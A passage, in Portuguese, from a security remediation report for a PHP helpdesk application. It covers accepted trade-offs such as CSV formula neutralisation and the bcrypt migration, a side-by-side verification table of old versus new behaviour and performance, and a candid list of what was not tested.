- **Timing/enumeração de usuário no login.** Durante a migração MD5→bcrypt os tempos de resposta variam por tipo de conta; equalizar agora seria falsa segurança. Resolve-se com F13 (rate limit) e com a conclusão da migração.

Trade-offs que assumi conscientemente nas correções (e como desfazê-los, se o negócio discordar):

- **F14 (apóstrofo no CSV):** títulos que começam com `= + - @` saem com `'` na frente. É uma alteração de conteúdo observável, só nesses casos. Se o relatório gerencial/faturamento comparar títulos literalmente, remova a chamada a `csvNeutralizarFormula()` em `exportarCsvVisivel()` (uma linha) e aceite o risco de F14.
- **F8 (sem arquivo em disco):** é a única mudança de comportamento potencialmente visível fora do manifesto (item 5 do checklist).
- **F5 (sem fallback de senha):** deliberadamente falha rápido; a alternativa de manter o fallback deixaria o problema como estava.

## 4. Como verifiquei e o que não consegui verificar

Montei um banco isolado a partir de `schema.sql` + `seed.sql` e executei **o código original e o novo lado a lado**:

| Verificação | Resultado |
| --- | --- |
| Caracterização das funções públicas (`var_export` de autenticar, formatarStatus, rotuloPrioridade em grade de 63 casos, listarChamados, verChamado, mediaResposta, exportarCsv) | **idêntica** ao original |
| Reflexão: nome, parâmetros, tipos, defaults e retorno das 7 funções | **idênticos** |
| HTTP, 23 requisições (anônimo, `ana`, `bruno`, `carla`; detalhe, listagem, busca, CSV, payloads) | diferem **só** onde corrigi (F2, F3, F4, F1, F7, F16); a visão da técnica é idêntica |
| Regra de visibilidade em casos de borda (cliente sem chamados, busca combinada com escopo, `papel` desconhecido) | correta; falha fechada |
| Login: migração MD5→bcrypt em `VARCHAR(255)`; `CHAR(32)` com `sql_mode` permissivo; senha errada; SQLi no login | ok nos dois schemas, sem truncar hash |
| Banco vazio / só NULL | original: `DivisionByZeroError`; novo: `0.0` e HTTP 200 |
| Desempenho, 5.000 chamados | 4.287 → 1 consulta; listagem 2.075 → 85 ms; CSV 2.425 → 47 ms |
| Rodando com `display_errors=1`, `E_ALL` nos fluxos testados (3 usuários × 8 URLs, incl. entradas em array) | 0 warnings/notices/deprecated |

**Limites honestos:**

- Testei em **MariaDB 11.8 + PHP 8.4.26 (servidor embutido `php -S`)**, não em MySQL 8 nem em php-fpm/Apache. As consultas são SQL padrão e `information_schema.COLUMNS` existe nos dois, mas não rodei no MySQL 8.
- Usei recursos de PHP ≥ 7.4 (`fputcsv` com `$escape = ''`, `session_start([...])` com `cookie_samesite`, tipos anuláveis) e evitei sintaxe só do PHP 8 (`match`, argumentos nomeados, `str_contains`). Assumo PHP ≥ 7.4 em produção; não testei em 7.x.
- **A condição de corrida de F8 não foi reproduzida** (só o arquivo residual foi observado) — por isso a confiança é 80.
- F13, F15 e F22 foram avaliados por leitura (são ausências/desenho), não por execução.
- Não tenho como saber se `EXPORT_DIR` está dentro do document root, nem se há rate limit/WAF na frente; ambos influenciam a severidade real de F8 e F13.
